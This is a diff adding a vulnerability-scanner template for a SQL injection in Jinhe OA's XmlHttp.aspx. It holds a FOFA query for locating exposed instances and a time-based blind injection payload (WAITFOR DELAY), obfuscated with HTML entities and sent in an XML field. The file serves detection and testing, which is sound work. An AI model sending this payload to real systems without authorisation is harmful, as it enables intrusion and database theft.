@@ -1,0 +1,40 @@
+id: jinhe-oa-xmlhttp-sqli
+info:
+  name: "金和OA XmlHttp.aspx 组件 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+          金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其OA系统XmlHttp.aspx组件存在SQL注入漏洞，攻击者可通过构造恶意SQL查询获取数据库敏感信息（包括管理员后台凭证及用户隐私数据），在具备高权限条件下可向服务器写入恶意文件，实现对目标系统的控制。
+  tags: 金和OA
+http:
+  - raw:
+      # baseline
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <root><Flag>CheckTask</Flag><TaskID>1</TaskID></root>
+
+      # payload（编码版）
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <root>
+        <Flag>CheckTask</Flag>
+        <TaskID>&#x2d;&#x31;&#x27;&#x3b;&#x57;&#x41;&#x49;&#x54;&#x46;&#x4f;&#x52;&#x20;&#x44;&#x45;&#x4c;&#x41;&#x59;&#x20;&#x27;&#x30;&#x3a;&#x30;&#x3a;&#x35;&#x27;&#x2d;&#x2d;</TaskID>
+        </root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "duration_2 >= duration_1 + 4"
+
